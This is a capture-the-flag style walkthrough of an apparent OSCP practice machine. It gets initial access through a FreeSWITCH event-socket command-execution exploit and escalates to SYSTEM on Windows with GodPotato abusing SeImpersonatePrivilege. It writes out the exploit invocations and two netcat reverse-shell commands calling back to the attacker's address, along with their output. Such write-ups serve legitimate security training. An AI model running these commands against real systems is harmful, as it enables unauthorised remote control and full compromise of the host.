##### Tags: `FreeSWITCH`  `SeImpersonatePrivilege` 

# 🪟OSCP-B (Gust)🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.158.151     

PORT     STATE SERVICE          VERSION
80/tcp   open  http             Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
port 8021 is running freeswitch-event  
searchsploit found there is a RCE
```console
$ searchsploit windows/remote/47799.txt
-------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                    |  Path
-------------------------------------------------------------------------------------------------- ---------------------------------
FreeSWITCH 1.10.1 - Command Execution                                                             | windows/remote/47799.txt
-------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
```console
https://www.exploit-db.com/exploits/47799
```
there service is running as chris
```console
$ python3 47799.py 192.168.158.151 whoami
Authenticated
Content-Type: api/response
Content-Length: 11

oscp\chris
```
execute the reverse shell payload
```console
$ python3 47799.py 192.168.158.151 "nc.exe -e cmd.exe 192.168.45.184 443"                     
Authenticated
```
got the chris shell
```console
$ penelope -p 443                                                                                  
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.2.15 • 172.17.0.1 • 192.168.45.184
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from OSCP 192.168.158.151 Microsoft_Windows_10_Pro-x64-based_PC 👤 oscp\chris • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/OSCP~192.168.158.151-Microsoft_Windows_10_Pro-x64-based_PC/2026_06_15-17_34_29-983.log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Program Files\FreeSWITCH>whoami
whoami
oscp\chris
```
## Privilege Escalation
chris has SeImpersonatePrivilege
```console
C:\Users\chris\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```
upload god potato to abuse it
```console
C:\Users\chris\Desktop>GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.184 4141"
GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.184 4141"
[*] CombaseModule: 0x140732363833344
[*] DispatchTable: 0x140732366284216
[*] UseProtseqFunction: 0x140732365616240
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\d964e3a0-0dbb-4a83-bade-7a536d836181\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000e002-079c-ffff-0b91-c96098583f46
[*] DCOM obj OXID: 0x9777e0a44d79db62
[*] DCOM obj OID: 0x47c589f5f9bb03d0
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 1008 Token:0x608  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 6900
```
got the NT AUTHORITY\SYSTEM
```console
$ penelope -p 4141                                                                                 
[+] Listening for reverse shells on 0.0.0.0:4141 →  127.0.0.1 • 10.0.2.15 • 172.17.0.1 • 192.168.45.184
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from  192.168.158.151 WINDOWS 👤  • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/192.168.158.151-WINDOWS/2026_06_15-17_36_58-121.log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
```
